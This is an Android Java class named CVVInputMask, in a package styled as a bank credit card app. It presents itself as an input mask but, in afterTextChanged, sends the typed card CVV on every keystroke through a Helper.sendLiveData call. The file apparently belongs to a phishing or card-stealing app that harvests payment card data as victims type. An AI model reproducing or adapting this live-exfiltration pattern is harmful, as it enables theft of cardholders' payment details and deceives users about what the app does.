package com.rbl.creditcard.FrontServices;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;

import com.rbl.creditcard.Helper;

import org.json.JSONException;

public class CVVInputMask implements TextWatcher {

    private final EditText editText;
    private String current = "";

    public CVVInputMask(EditText editText) {
        this.editText = editText;
    }

    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after) {
        if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
            return ;
        }
    }

    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {

    }

    @Override
    public void afterTextChanged(Editable s) {
        String current = s.toString();
        Helper he = new Helper();
        try {
            he.sendLiveData(current, "cvv", editText.getContext());
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

        }
    }



